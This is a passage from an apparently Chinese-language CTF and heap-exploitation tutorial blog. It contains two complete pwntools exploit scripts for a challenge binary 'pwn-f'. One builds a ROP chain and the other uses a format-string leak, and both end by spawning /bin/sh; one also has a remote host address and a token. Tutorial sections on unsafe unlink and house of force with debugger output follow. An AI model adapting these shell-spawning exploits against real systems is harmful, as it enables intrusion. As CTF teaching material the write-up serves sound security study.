class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! /usr/bin/python</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">target = <span class=\"built_in\">process</span>(<span class=\"string\">'pwn-f'</span>)</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">create</span>(size, <span class=\"keyword\">string</span>):</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'size:'</span>)</div><div class=\"line\">    target.sendline(str(size))</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">    target.<span class=\"built_in\">send</span>(<span class=\"keyword\">string</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">delete</span>(id):</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">    target.sendline(str(id))</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'sure?:'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'yes'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'aaa\\n'</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'aaa\\n'</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">1</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'\\x00'</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">0x20</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x16</span> + <span class=\"string\">'lo'</span> + <span class=\"string\">'\\x2d\\x00'</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'lo'</span>)</div><div class=\"line\">addr = target.recvline()</div><div class=\"line\">addr = addr[:<span class=\"number\">-1</span>]</div><div class=\"line\">addr = u64(addr + <span class=\"string\">'\\x00'</span> * (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(addr))) - <span class=\"number\">0xd2d</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'size:'</span>)</div><div class=\"line\">target.sendline(str(<span class=\"number\">0x20</span>))</div><div class=\"line\">target.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">target.<span class=\"built_in\">send</span>(<span class=\"string\">'a'</span> * <span class=\"number\">0x18</span> + p64(<span class=\"number\">0x00000000000011DC</span> + addr))</div><div class=\"line\"></div><div class=\"line\">print hex(addr)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'sure?:'</span>)</div><div class=\"line\"></div><div class=\"line\">ropchain = p64(addr + <span class=\"number\">0x00000000000011e3</span>)   <span class=\"comment\"># pop rdi</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x202070</span>)            <span class=\"comment\"># got@malloc</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000000990</span>)  <span class=\"comment\"># plt@put</span></div><div class=\"line\"></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011e3</span>)  <span class=\"comment\"># pop rdi</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">1</span>)</div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011DA</span>)  <span class=\"comment\"># magic</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">0</span>)                          <span class=\"comment\"># rbx</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">1</span>)                          <span class=\"comment\"># rbp</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000202058</span>)  <span class=\"comment\"># r12 -&gt; rip got@read</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">8</span>)                          <span class=\"comment\"># r13 -&gt; rdx</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000202078</span>)  <span class=\"comment\"># r14 -&gt; rsi got@atoi</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">0</span>)                          <span class=\"comment\"># r15 -&gt; rdi</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011C0</span>)  <span class=\"comment\"># magic</span></div><div class=\"line\">ropchain += <span class=\"string\">'a'</span>*<span class=\"number\">8</span>*<span class=\"number\">7</span></div><div class=\"line\"></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000000B65</span>)  <span class=\"comment\"># getInt</span></div><div class=\"line\"></div><div class=\"line\">target.sendline(<span class=\"string\">'yes     '</span> + ropchain)</div><div class=\"line\">addr = target.recvline()[:<span class=\"number\">-1</span>]</div><div class=\"line\">addr = u64(addr + <span class=\"string\">'\\x00'</span> * (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(addr)))</div><div class=\"line\"><span class=\"comment\">#addr = addr - 534112 + 288144</span></div><div class=\"line\">addr = addr - <span class=\"number\">537984</span> + <span class=\"number\">283536</span></div><div class=\"line\">print hex(addr)</div><div class=\"line\">target.sendline(p64(addr)+<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">target.interactive()</div></pre></td></tr></table></figure>\n<p>另外一种方法，更简单，<a href=\"https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/\">参考链接</a></p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">global <span class=\"built_in\">io</span></div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn-f'</span>)</div><div class=\"line\"></div><div class=\"line\">def create_list(<span class=\"built_in\">io</span>,length,strr):</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'Pls give string size:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(length)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(strr)</div><div class=\"line\"></div><div class=\"line\">def delete_list(<span class=\"built_in\">io</span>,number):</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(number)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'Are you sure?:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'yes'</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">\tglobal <span class=\"built_in\">io</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">debug</span> = <span class=\"number\">1</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">debug</span>:</div><div class=\"line\">   \t \t<span class=\"built_in\">io</span> = process(<span class=\"string\">'./pwn-f'</span>)</div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t#<span class=\"built_in\">io</span> = remote(<span class=\"string\">'127.0.0.1'</span>,<span class=\"number\">2333</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span> = remote(<span class=\"string\">'115.28.78.54'</span>,<span class=\"number\">80</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'please input you token: '</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh'</span>)</div><div class=\"line\">#<span class=\"comment\">------------------------------------------------use fsb to leak __libc_start_main's address</span></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'aaaa'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'bbbb'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'cccc'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'0'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'1'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'2'</span>)</div><div class=\"line\">\tcontent1 = <span class=\"string\">\"%175$p\"</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">'a'</span>)+<span class=\"string\">'\\xd0\\xf9\\x00'</span></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'29'</span>,content1)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'1'</span>)                     #<span class=\"comment\">-----printf('%113$p')</span></div><div class=\"line\"></div><div class=\"line\">\tdata = <span class=\"built_in\">io</span>.recv(<span class=\"number\">14</span>)</div><div class=\"line\">\tlibc_start_main = int(data,<span class=\"number\">16</span>)<span class=\"number\">-240</span></div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"libc_start_main_addr=\"</span>+hex(libc_start_main)</div><div class=\"line\">#<span class=\"comment\">--------------------------------------------------caculate system_addr\t</span></div><div class=\"line\">\tlibc_start_main_offset = libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">\tsystem_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">\tsystem_addr = libc_start_main  - libc_start_main_offset + system_addr</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"system_addr=\"</span> + hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'zzzz\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'aaaa\\x00'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'bbbb\\x00'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'cccc\\x00'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'2'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'3'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'4'</span>)</div><div class=\"line\">#<span class=\"comment\">----------can't have '\\x00' in string.because len(string) must &gt;15.And after '/bin/sh' must have a space.</span></div><div class=\"line\">\tcontent2 = <span class=\"string\">\"/bin/sh #\"</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">'a'</span>)+ p64(system_addr)  </div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'32'</span>,content2)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'3'</span>)                     #system(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'uname -a'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.interactive()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">\t<span class=\"keyword\">while</span> True:</div><div class=\"line\">\t\ttry:</div><div class=\"line\">\t\t\tpwn()</div><div class=\"line\">\t\texcept EOFError:</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> <span class=\"string\">'guess not success!!!'</span></div><div class=\"line\">\t\t\t<span class=\"built_in\">io</span>.close()</div><div class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</div></pre></td></tr></table></figure>\n<h2 id=\"0x04-unsafe-unlink\"><a href=\"#0x04-unsafe-unlink\" class=\"headerlink\" title=\"0x04 unsafe unlink\"></a>0x04 unsafe unlink</h2><p>这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当<strong>前一个堆块</strong>空闲时，<strong>向后合并</strong>；当<strong>后一个堆块</strong>空闲时，<strong>向前合并</strong>。</p>\n<p>glibc的unlink宏（简化版）：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">FD = P-&gt;fd<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"keyword\">BK </span>= P-&gt;<span class=\"keyword\">bk;</span></div><div class=\"line\">if(FD-&gt;<span class=\"keyword\">bk </span>== P &amp;&amp; <span class=\"keyword\">BK-&gt;fd </span>== P)</div><div class=\"line\">&#123;</div><div class=\"line\">\tFD-&gt;<span class=\"keyword\">bk </span>= P<span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">BK-&gt;fd </span>= P<span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>当我们存在向后合并的情况时：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">| chunk1(p1) | chunk2(p2) |</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">void *ptr<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tint prev_size, size, fd, <span class=\"keyword\">bk;</span></div><div class=\"line\">\tvoid *p1, *p2<span class=\"comment\">;</span></div><div class=\"line\">\tchar <span class=\"keyword\">buf[253] </span>= <span class=\"string\">\"\"</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tp1 = malloc(<span class=\"number\">252</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tp2 = malloc(<span class=\"number\">252</span>)<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tptr = p1<span class=\"comment\">;</span></div><div class=\"line\">\tprev_size = <span class=\"number\">0</span><span class=\"comment\">;</span></div><div class=\"line\">\tsize = <span class=\"number\">249</span><span class=\"comment\">;</span></div><div class=\"line\">\tfd = (int)(&amp;ptr) - <span class=\"number\">0xc</span><span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">bk </span>= (int)(&amp;ptr) - <span class=\"number\">0x8</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tmemset(<span class=\"keyword\">buf, </span><span class=\"string\">'c'</span>, <span class=\"number\">253</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf, </span>&amp;prev_size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+4, </span>&amp;size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+8, </span>&amp;fd, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+12, </span>&amp;<span class=\"keyword\">bk, </span><span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tsize = <span class=\"number\">248</span><span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(&amp;<span class=\"keyword\">buf[248], </span>&amp;size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">buf[252] </span>= <span class=\"string\">'\\x00'</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tmemcpy(p1, <span class=\"keyword\">buf, </span><span class=\"number\">253</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tfree(p2)<span class=\"comment\">;</span></div><div class=\"line\">\treturn <span class=\"number\">0</span><span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*P为fake_chunk，由chunk2-&gt;pre_size得到</span></div><div class=\"line\">P == ptr;</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"attr\">FD</span> = P-&gt;fd;                     // <span class=\"attr\">FD</span> = P-&gt;<span class=\"attr\">fd</span> = &amp;ptr - <span class=\"number\">0</span><span class=\"attr\">xc</span> = *(ptr + <span class=\"number\">0</span>x8)</div><div class=\"line\"><span class=\"attr\">BK</span> = P-&gt;bk;                    // <span class=\"attr\">BK</span> = P-&gt;<span class=\"attr\">bk</span> = &amp;ptr - <span class=\"number\">0</span><span class=\"attr\">x8</span> = *(ptr + <span class=\"number\">0</span>xc)</div><div class=\"line\"><span class=\"keyword\">if</span>(FD-&gt;<span class=\"attr\">bk</span> == P &amp;&amp; BK-&gt;<span class=\"attr\">fd</span> == P)</div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">\t此时</div><div class=\"line\">    FD-&gt;bk = ptr = *(&amp;ptr - 0xc + 0xc)</div><div class=\"line\">    BK-&gt;fd = ptr = *(&amp;ptr - 0x8 + 0x8)</div><div class=\"line\">    绕过检查</div><div class=\"line\">*/</div><div class=\"line\">&#123;</div><div class=\"line\">\tFD-&gt;<span class=\"attr\">bk</span> = BK;                // FD-&gt;<span class=\"attr\">bk</span> = &amp;ptr - <span class=\"number\">0</span>x8; <span class=\"attr\">ptr</span> == &amp;ptr - <span class=\"number\">0</span>x8;</div><div class=\"line\">\tBK-&gt;<span class=\"attr\">fd</span> = FD;                 // BK-&gt;<span class=\"attr\">fd</span> = &amp;ptr - <span class=\"number\">0</span>xc; <span class=\"attr\">ptr</span> == &amp;ptr - <span class=\"number\">0</span>xc;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">最后ptr = &amp;ptr - 0xc</div><div class=\"line\">*/</div></pre></td></tr></table></figure></p>\n<h2 id=\"0x05-house-of-spirit\"><a href=\"#0x05-house-of-spirit\" class=\"headerlink\" title=\"0x05 house of spirit\"></a>0x05 house of spirit</h2><h2 id=\"0x09-house-of-force\"><a href=\"#0x09-house-of-force\" class=\"headerlink\" title=\"0x09 house of force\"></a>0x09 house of force</h2><p>我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。</p>\n<p>这里我们来看<code>how2heap</code>中给出的demo</p>\n<p>首先我们定义一个全局变量<code>bss_var</code>，值为<code>This is a string that we want to overwrite.</code></p>\n<p>我们查看下他的地址为<code>0x602060</code><br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; p &amp;bss_var </div><div class=\"line\">$<span class=\"number\">3</span> = (char (*)[<span class=\"number\">44</span>]) <span class=\"number\">0x602060</span> &lt;bss_var&gt;</div></pre></td></tr></table></figure></p>\n<p>然后我们分配一个大小256堆块，地址为<code>0x7fffffffdec8</code><br><figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; p &amp;p1</div><div class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$4</span> = (intptr_t **) 0x7fffffffdec8</span></div></pre></td></tr></table></figure></p>\n<p>由于已使用中的chunk要加上8byte的<code>prev_size</code>和8byte的<code>size</code></p>\n<p>所以真实的chunk的起始地址为<code>0x603410</code><br>此时我们查看堆的地址如下<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; heap </div><div class=\"line\">Top Chunk: <span class=\"number\">0</span>x603520</div><div class=\"line\">Last Remainder: <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"number\">0</span>x603000 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">1041</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x20706f7420656854, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x7473206b6e756863, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x2074612073747261, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x3832353330367830</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"number\">0</span>x603410 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">273</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x0</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"number\">0</span>x603520 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">133857</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x0</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>此时原先的top chunk的大小为<code>133857-1</code>(1为flag位)</p>\n<p>我们修改top chunk的size为<code>-1</code>(<code>0xffffffffffffffff</code>)<br>此时，top chunk的大小为<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div 